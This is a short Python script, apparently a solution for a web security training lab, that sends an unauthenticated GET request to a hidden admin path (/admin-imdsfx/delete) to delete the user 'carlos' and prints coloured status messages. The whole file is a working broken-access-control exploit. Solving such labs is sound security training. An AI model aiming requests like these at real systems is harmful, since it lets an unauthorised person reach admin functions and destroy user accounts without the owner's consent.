import requests
from colorama import Fore
import sys
import time

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 main.py <Lab_URL>")
        sys.exit(1)

    lab_url = sys.argv[1]
    params = {
        "username": "carlos"
    }
    print(Fore.CYAN + "Accessing the admin panel through /admin-imdsfx")
    admin_url = f"{lab_url}/admin-imdsfx"
    time.sleep(2)
    print(Fore.RED + "Deleting the user called carlos")
    delete_carlos_url = f"{admin_url}/delete"
    r = requests.get(delete_carlos_url, params=params)
    if r.status_code == 302:
        print(Fore.GREEN + "Successfully deleted the user called carlos")
    else:
        print(Fore.RED + "User doesn't exists")
        
if __name__ == '__main__':
   main()
